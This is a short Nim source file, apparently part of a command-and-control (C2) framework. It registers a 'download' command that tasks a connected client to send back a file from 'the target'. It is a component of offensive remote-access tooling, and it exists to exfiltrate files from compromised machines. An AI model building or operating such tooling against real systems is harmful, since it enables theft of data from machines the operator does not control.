import asyncdispatch, tables

import ../../types
import ../../communication

import ../../../clientTasks/download

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  let task = await download.sendTask(server.cli.handlingClient, args[0])
  
  await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "download",
  argsLength: 1,
  usage: @["download [path]"],
  cliMode: @[ClientInteractMode],
  description: "Download a file from the target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)